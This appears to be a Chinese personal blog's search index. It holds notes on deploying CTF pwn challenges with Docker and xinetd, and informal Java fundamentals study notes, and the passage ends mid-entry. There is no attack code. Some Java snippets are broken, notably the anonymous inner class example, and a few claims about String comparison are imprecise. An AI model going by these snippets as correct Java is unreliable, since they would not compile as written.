<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>yubのAlgorithm0.0</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm0.0/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm0.0/</url>
      
        <content type="html"><![CDATA[<h3 id="闲言碎语"><a href="#闲言碎语" class="headerlink" title="闲言碎语"></a>闲言碎语</h3><p>​思来想去还是想把之前打卡的内容搬过来（毕竟博客修修补补还是勉强可以凑合看 笑）还是作为自己的点滴记录吧.<br>​wi师傅说毕设手搓一个自己的博客系统GitHub上能有几千star那包过的，倒是有这么个想法，说不定自己哪天也可以实现呢.<br>​之后搬运过来的内容也算是复习了，希望自己能在薄弱的方面越来越好.【这个时候在Harmony开发课上插着耳机一个人passion hh】</p><p>希望自己这次能真正坚持下来.<br>(在学习的学弟学妹们也继续加油哦 期待你们成为自己理想中的pwn✌)</p><p>共勉.</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎片， </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker部署小记</title>
      <link href="/2024/11/04/Docker%E9%83%A8%E7%BD%B2%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/11/04/Docker%E9%83%A8%E7%BD%B2%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>上次出题还是上次，好多指令已经记不清了.<br>暂时写在这里，给自己也给以后的你们查阅.</p><h3 id="有用的工具"><a href="#有用的工具" class="headerlink" title="有用的工具"></a>有用的工具</h3><p>如果你去喜欢的浏览器搜索，不难发现xinetd确实很实用.(笑)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br></pre></td></tr></table></figure><p>安装之后发现长这样<br><img src="/../imgs/2024-10/QQ%E6%88%AA%E5%9B%BE20241107230639.png"></p><p>手搓docker-compose.yml（不会也可以找人机hh）.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">pwn:</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">./</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">pwn</span> <span class="comment">#这里的image写自己创建的镜像名</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;60001:9999&quot;</span></span><br><span class="line">        <span class="attr">pids_limit:</span> <span class="number">1024</span></span><br><span class="line">        <span class="comment"># cpus: 0.5</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">        <span class="comment"># privileged: true</span></span><br></pre></td></tr></table></figure><p><strong>ctf.xinetd文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./oneChance</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>.&#x2F;+自己编译好的ELF文件</strong><br>如果涉及到堆的题目 修改Dockerfile至与红框内容一致.(18.04以上的都和这个保持一致)</p><p><img src="/../imgs/2024-10/image-20241107234628376.png" alt="image-20241107234628376"></p><p><strong>start.sh文件</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="string">sed</span> <span class="string">-i</span> <span class="string">&quot;s/cdusec&#123;pwntestflag&#125;/$FLAG/&quot;</span> <span class="string">/home/ctf/flag</span></span><br><span class="line"><span class="string">export</span> <span class="string">FLAG=&quot;&quot;</span></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line"><span class="string">/etc/init.d/xinetd</span> <span class="string">start;</span></span><br><span class="line"><span class="string">sleep</span> <span class="string">infinity;</span></span><br></pre></td></tr></table></figure><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p &quot;127.0.0.1:8888:9999&quot; -h &quot;pwn&quot; --name=&quot;pwn&quot; pwn</span><br></pre></td></tr></table></figure><p>-p后面的内容就是把9999端口映射到8888端口（可改）<br>–name后面的内容是指定<a href="https://cloud.tencent.com/product/tke?from=10680">容器</a>的名称，而-h是指定容器的hostname，而最后的是image的名字，要根据建的镜像名进行修改.</p><p><strong>部署参考文章</strong>：<a href="https://blog.csdn.net/qq_52820087/article/details/127851116">web和pwn题的简单动态flag实现_gzctf-CSDN博客</a></p><h3 id="实用的命令"><a href="#实用的命令" class="headerlink" title="实用的命令"></a>实用的命令</h3><p>You’re master！</p><h5 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我的系统环境：Ubuntu 22.04</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新软件包</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装docker</span></span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查docker是否安装成功</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><h5 id="制作镜像并上传"><a href="#制作镜像并上传" class="headerlink" title="制作镜像并上传"></a>制作镜像并上传</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;pwn&quot; .</span><br></pre></td></tr></table></figure><p><strong>注意后面的 .</strong></p><h5 id="查看本机所有镜像"><a href="#查看本机所有镜像" class="headerlink" title="查看本机所有镜像"></a>查看本机所有镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h5 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run</span><br></pre></td></tr></table></figure><h5 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop</span><br></pre></td></tr></table></figure><h5 id="强制停止容器"><a href="#强制停止容器" class="headerlink" title="强制停止容器"></a>强制停止容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker kill </span><br></pre></td></tr></table></figure><h5 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm</span><br></pre></td></tr></table></figure><h5 id="强制删除镜像"><a href="#强制删除镜像" class="headerlink" title="强制删除镜像"></a>强制删除镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f &lt;IMAGE_ID&gt;</span><br></pre></td></tr></table></figure><h5 id="删除所有未被使用的镜像"><a href="#删除所有未被使用的镜像" class="headerlink" title="删除所有未被使用的镜像"></a>删除所有未被使用的镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image prune -a</span><br></pre></td></tr></table></figure><h5 id="删除所有镜像"><a href="#删除所有镜像" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f $(docker images -q)</span><br></pre></td></tr></table></figure><p>这个命令会删除包括 <code>&lt;none&gt;</code> 标签在内的所有镜像.<br>其中两个具体什么意思其实也可以猜出来，搞不赢也可以去STFW.</p><h5 id="进入-Docker-容器以查看其中的内容"><a href="#进入-Docker-容器以查看其中的内容" class="headerlink" title="进入 Docker 容器以查看其中的内容"></a>进入 Docker 容器以查看其中的内容</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;CONTAINER_ID&gt; /bin/bash</span><br></pre></td></tr></table></figure><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>操作中特别注意权限问题（提权和可777）,以及预留够足够的空间.<br>上传到平台一定要进行好测试.</p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础知识杂记</title>
      <link href="/2024/06/22/Java%E6%9D%82%E8%AE%B0/"/>
      <url>/2024/06/22/Java%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Java杂记"><a href="#Java杂记" class="headerlink" title="Java杂记"></a>Java杂记</h2><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112541356.png" alt="image-20240203112541356"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112929728.png" alt="image-20240203112929728"></p><p>静态方法无法继承 无实例化对象</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112627335.png" alt="image-20240203112627335"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112645067.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112823024.png" alt="image-20240203112823024"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112834853.png" alt="image-20240203112834853"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203112849352.png" alt="image-20240203112849352"></p><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>数组索引异常<br>空指针异常<br>算数异常<br>丢失资源<br>找不到类<br>编译时异常</p><p>oop 面向对象的语言<br>对象的成员属性在未赋值前<br>引用类型的默认值是NULL<br>见到那类型为对应的0</p><p><strong>通过this可以访问当前对象的成员属性&#x2F;成员变量（静态的成员变量不支持）</strong></p><p>默认<br>int - 0<br>float - 0.0f<br>char - ‘\u0000’<br>boolean - flase</p><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><p>非特殊的一个方法：<br>1.方法名必须和类名相同<br>2.没有返回值<br>3.创建对象时由编译器自动调用</p><p><strong>当一个类中没有任何一个构造方法时 java会自动提供一个无参的构造方法</strong></p><h4 id="构造方法之间可以形成方法的重载"><a href="#构造方法之间可以形成方法的重载" class="headerlink" title="构造方法之间可以形成方法的重载"></a>构造方法之间可以形成方法的重载</h4><p>1.方法名相同<br>2.参数列表不同</p><p><strong>构造方法只对对象中的成员进行初始化 不进行空间分配</strong></p><h4 id="完成一个对象的构造"><a href="#完成一个对象的构造" class="headerlink" title="完成一个对象的构造"></a>完成一个对象的构造</h4><p>1.分配内存<br>2.调用合适的构造方法</p><p>this（）；调用当前类当中其他构造方法<br>只能在当前的构造方法内部进行使用<br>只能放在第一行</p><p>this.data访问当前对象的属性<br>this.func（）调用当前对象的方法<br>this本身代表当前对象的引用</p><p>就地初始化<br>声明成员变量的同时进行初始化<br>即在class内进行初始化</p><h4 id="面向对象的三大特性"><a href="#面向对象的三大特性" class="headerlink" title="面向对象的三大特性"></a>面向对象的三大特性</h4><p>封装 private修饰<br>是数据和操作数据的方法进行有机结合 隐藏对象的属性和实现细节 仅对外公开接口来和对象进行交互<br>对类的成员 进行隐藏 通过关键字private 只是对类对外提供公开的接口<br>意义<br>可以隐藏的实现细节 从而达到安全性<br>继承<br>多态</p><h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><p>更好的管理类<br>多个类收集成为一组 对类或接口很好的组织方式<br>对类、接口等封装机制的体现 </p><p>非静态成员变量属于对象 访问方式 对象的引用.xxx<br>静态成员变量的使用 不依赖于对象（不用实例化 【new】）类名.xxxx<br>静态成员变量（类变量）<br>静态方法  （类方法）</p><p>静态方法内部不能直接调用非静态方法&#x2F;成员变量<br>static方法中不能使用this<br>需通过对象的引用调用静态方法<br>可以通过类名进行访问<br>调用静态方法不需要实例对象</p><p>实例</p><p>静态代码块&gt;实例代码块&gt;构造代码块<br>静态代码块只执行一次</p><p>实例代码块一定是实例化对象的时候被执行</p><p>在java中类的静态变量会被默认初始化<br>构造方法中形参名和成员变量名相同 需要用this指定<br>在类外使用需要使用public访问修饰符</p><p>static只能修饰成员变量 不修饰局部变量</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>当子类和父类是同名成员变量 优先访问子类<br>访问父类-&gt;super关键字<br>this访问既可以访问父类也可以访问子类成员变量 同名时 优先子类<br>super只能访问从父类继承过来的成员变量<br>super在非静态的方法中使用<br>super和this再构造方法调用时 都只能放在第一句 且不能同时出现</p><p>在不同包中访问父子间关系 protected<br>main方法为静态的 所以先创造一个构造方法<br>一个类不想被继承使用final关键字修饰 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">99</span>；</span><br><span class="line">&#125;<span class="comment">//密封类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span>定义 -&gt;常量</span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>；</span><br><span class="line">a = <span class="number">20</span>；</span><br></pre></td></tr></table></figure><p>继承 is-a的关系<br>组合是 has-a&#x2F;a part of 的关系</p><h4 id="多态实现条件"><a href="#多态实现条件" class="headerlink" title="多态实现条件"></a>多态实现条件</h4><p>向上转型<br>1.直接赋值<br>2.方法传参的方式<br>3.返回值<br>通过父类引用 调用这个父类 子类重写的方法<br>子类和父类 有同名覆盖&#x2F;重写<br>通过父类对象 调用父类和子类重写的方法<br>满足上述3点 只是会发生动态绑定</p><h4 id="重写-覆盖规则"><a href="#重写-覆盖规则" class="headerlink" title="重写&#x2F;覆盖规则"></a>重写&#x2F;覆盖规则</h4><p>方法名一样<br>参数列表一样 （类型 个数 顺序）<br>返回值一样</p><h4 id="重写的注意事项"><a href="#重写的注意事项" class="headerlink" title="重写的注意事项"></a>重写的注意事项</h4><p>1.被private修饰不可重写<br>2.被static修饰 属于类不属于方法<br>3.被final修饰的方法不可重写<br>4.访问修饰限定符 private&lt;默认权限&lt;protected&lt;public（子类的访问修饰权限一定要大于等于父类的）<br>5.方法的返回值 可以不同 但必须是父子类关系（斜变类型）<br>6.构造方法不能发生重写</p><h4 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h4><p>方法名相同<br>参数列表不同（个数 类型 顺序）<br>返回值不同（可有可无）</p><h4 id="代码的执行顺序"><a href="#代码的执行顺序" class="headerlink" title="代码的执行顺序"></a>代码的执行顺序</h4><p>1.执行父类和子类的静态（先父后子）<br>2.父类的实例<br>3.父类的构造<br>4.子类的实例<br>5.子类的构造</p><p>1.抽象类是被abstract修饰的<br>2.被abstract修饰的方法成为抽象方法  该方可以没有具体实现<br>3.当一个类中含有抽象方法的时候 该类必须使用abstract修饰<br>4.抽象类中可以有和普通类一样的成员变量 一样的成员方法<br>5.抽象类不可被实例化<br>6.抽象类 目的就是为了被继承<br>7.当一个普通的类 继承了抽象类之后 该普通类一定要重写抽象类当中的所有抽象方法<br>8.fina、privatel和abstract不能同时存在（fina、privatel修饰一定不能重写 abstract修饰一定要重写）抽象类不能被static修饰<br>9.当一个抽象类A不想被一个普通类B继承 此时可以把这个类变成抽象类 当一个普通类C继承抽象类B之后 C要重写B和A当中所有的抽象方法<br>10.当一个类实现接口当中的方法之后 当前类当中的方法必须加public<br>抽象类中不一定包含抽象方法 但有抽象方法的类一定是抽象类<br>抽象类中可以有构造方法 供子类创建对象时 初始化父类的成员变量<br>11.接口当中不能有构造方法和代码块<br>12.一个接口也会产生独立的字节码文件 （编译之后.class）<br>13.类没有实现接口中的所有方法 那它必须设置为抽象类</p><p>匿名对象的缺点 每次使用都得重新实例化</p><h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>1.使用interface定义接口<br>2.接口当中的成员变量 默认是public static final<br>3.接口当中的成员方法 默认是public abstract 一般情况下不写<br>4.接口当中不可以有普通的方法<br>5.java8开始 允许在接口中定义一个default方法 修饰普通类<br>6.接口当中的方法若被static修饰的方法 可以有具体的实现<br>7.接口不能通过new关键字进行实例化<br>8.类和接口之间可以通过关键字implements实现接口 实现之后要重写所有的方法<br>9.接口可以发生向上转型 动态绑定</p><p><strong>先继承再实现接口 java中只能继承一个类实现多个接口</strong><br>接口成员变量默认：public static final<br>接口当中成员方法默认：public abstract</p><p><strong>抽象类和接口都不可以实例化</strong><br>抽象类A继承抽象类B 抽象类A可以不重写抽象类B中的方法 如果是普通类继承 需要重写</p><p>接口间的继承相当于合并 </p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203135046040.png" alt="image-20240203135046040"></p><h4 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h4><p>核心区别<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203135240178.png" alt="image-20240203135240178"></p><h4 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h4><p>所有类的父类 尽管无显示继承（默认继承）<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203141628670.png" alt="image-20240203141628670"></p><p>equals方法返回true或false<br><strong>以后自定义的类型 一定重写equals方法</strong><br>equals方法不能用于基本数据类型的变量（Byte，short，int，long，double，folat，<a href="https://so.csdn.net/so/search?q=boolean&spm=1001.2101.3001.7020">boolean</a>，char）</p><p><strong>“&#x3D;&#x3D;”比较基本数据类型时比较的是表面值内容，而比较两个对象时比较的是两个对象的内存地址值</strong><br><strong>&#x3D;&#x3D; 在基本数据类型：值内容, 引用类型时：地址</strong><br><strong>equals 重写：值内容 ， equals不重写：地址</strong></p><p>重写hashcode 使得两个对象 逻辑上在同一个位置<br>自定义类型 比较大小 实现compareable接口<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203144521872.png" alt="image-20240203144521872"></p><p>此接口对类的侵入性较强 可扩展性弱</p><p>不同包的不同访问<br>clone方法的异常是受查异常&#x2F;编译时异常 必须是编译时处理<br>向下转型 需要强制类型转换<br>空接口-&gt; 标记接口 证明当前类是可以被克隆的</p><h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><p>并没有对对象中的对象进行克隆</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203162918839.png" alt="image-20240203162918839"></p><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203163553312.png" alt="image-20240203163553312"></p><p>看代码的实现过程</p><h4 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h4><p>一个类一个字节码文件</p><p><strong>实例内部类</strong></p><p>获取实例内部类对象时 依赖外部类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OutClass.<span class="type">InnerClass</span> <span class="variable">innerClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutClass</span>.<span class="keyword">new</span> <span class="title class_">InnerClass</span>();</span><br><span class="line">innerClass.test();</span><br></pre></td></tr></table></figure><p><strong>在实例内部内中 定义静态的成员变量需要使用public static final</strong><br>原因：静态方法首先执行且不依赖任何对象 但内部类的实现依赖外部类<br>final修饰常量 不需要类加载 </p><p>类加载的时候不会加载普通成员变量 实例内部类中存在static static是在类加载的时候创建的</p><p>当外部类中的数据成员和内部类中的数据成员相同时 可以通过外部类.this访问外部类成员变量（OuterClass.this）<br>实例内部类对象中包含外部类的this 因此可以通过内部类访问外部类的成员变量（public权限）</p><p><strong>注意</strong><br>1.外部类中的任何成员都可以在实例内部类方法中直接访问<br>⒉.实例内部类所处的位置与外部类成员位置相同，因此也受public、private等访问限定符的约束<br>3.在实例内部类方法中访问同名的成员时，优先访问自己的，如果要访问外部类同名的成员，必须:外部类名称.this.同名成员来访问<br>4.实例内部类对象必须在先有外部类对象前提下才能创建<br>5.实例内部类的非静态方法中包含了一个指向外部类对象的引用<br>6.外部类中，不能直接访问实例内部类中的成员，如果要访问必须先要创建内部类的对象。</p><p><strong>静态内部类</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164615108.png" alt="image-20240203164615108"></p><p>获取静态内部类对象</p><p>在静态内部类中范根外部类的非静态数据成员<br>内部类为静态 直接访问即可</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OuterClass outclass <span class="operator">=</span> new OuterClass（）<span class="comment">;</span></span><br><span class="line">System.out.println(outerclass.data1)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>在静态内部类中蓄能访问外部类中的静态成员（要访问 提供外部类对象的引用）<br>创建静态内部类对象是 不需要先创建外部类对象</p><p><strong>匿名内部类</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164446363.png" alt="image-20240203164446363"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164524232.png" alt="image-20240203164524232"></p><p>外部类名$内部类名<br>外部类类名$数字<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240203164907493.png" alt="image-20240203164907493"></p><p>在匿名内部类中 能够被访问的是没有被修改过的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span> &#123;</span><br><span class="line">implementationvoid <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"> a = <span class="keyword">new</span> <span class="title class_">A</span>(()&#123;</span><br><span class="line"> <span class="meta">@override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//默认在这里访问的是被final修饰的</span></span><br><span class="line">system.out.println(<span class="string">&quot;值: &quot;</span>+val);<span class="comment">//在匿名内部类当中能够访问的是没有被修改过的数据&#125;</span></span><br><span class="line">&#125;;</span><br><span class="line">a.test();</span><br><span class="line">val = <span class="number">100</span>;|</span><br><span class="line">system.out.println(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;；</span><br><span class="line">a.test();</span><br></pre></td></tr></table></figure><p><strong>局部内部类</strong></p><p>只能定义在方法内部<br>1.局部内部类只能在所定义的方法本内部使用<br>2.不能被public、static等修饰符修饰<br>3.编译器也有自己独立的字节码文件<br>命名格式:外部类名字$数字内部类名字.class4.几乎不会使用</p><h4 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h4><h5 id="比较是否引用同一个对象"><a href="#比较是否引用同一个对象" class="headerlink" title="&#x3D;&#x3D;比较是否引用同一个对象"></a>&#x3D;&#x3D;比较是否引用同一个对象</h5><p> 任何情况下只要等号两边是引用类型一定注意看此时比较的是什么?如何要比较两个引用所指向对象的内容是否一致</p><p>一定重写equals方法–&gt;<br>不重写就会默认调用object的equals方法</p><p>自定义类型一定要重写equels（）方法</p><p>区别于C语言 java中的字符串没有’\0’结尾<br>子类重写了父类的方法后进行调用 优先调用子类自己的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">System.out.println(str3 == str4);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240208201812965.png" alt="image-20240208201812965"></p><p>存储双引号引起来的值<br>存储内容为字符串的常量值<br><strong>存储步骤：</strong><br>看 常量池有无当前字符串<br>无 存入<br>有 获取已经存储在常量池中的值的地址</p><p>StringTable –&gt;其实是一个哈希表</p><p><strong>作用</strong><br>提高存储效率</p><p>使用String方法时 默认先进行字符串长度比较 再进行内容比较（hash）return ASCII差值（相同则返回长度）</p><h4 id="equals方法比较"><a href="#equals方法比较" class="headerlink" title="equals方法比较"></a>equals方法比较</h4><p>比较内容是否相等<br>返回boolen类型（true&#x2F;flase）<br>按照字典序（字符的大小顺序）<br>先长度后大小</p><h4 id="CompareTo方法比较"><a href="#CompareTo方法比较" class="headerlink" title="CompareTo方法比较"></a>CompareTo方法比较</h4><p>返回int类型</p><p>先按照字典次序大小比较，如果出现不等的字符，直接返回这两个字符的大小差值 </p><p>如果前k个字符相等(k为两个字符长度最小值)，返回值两个字符串长度差值</p><h4 id="忽略大小写进行比较"><a href="#忽略大小写进行比较" class="headerlink" title="忽略大小写进行比较"></a>忽略大小写进行比较</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;Abcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">System.out.println(str3.compareToIgnoreCase(str4));<span class="comment">//输出0</span></span><br></pre></td></tr></table></figure><h4 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211195141440.png" alt="image-20240211195141440">从0下标开始<br>例如lastIndexof（）</p><h4 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h4><h5 id="数值和字符串转化"><a href="#数值和字符串转化" class="headerlink" title="数值和字符串转化"></a>数值和字符串转化</h5><figure class="highlight 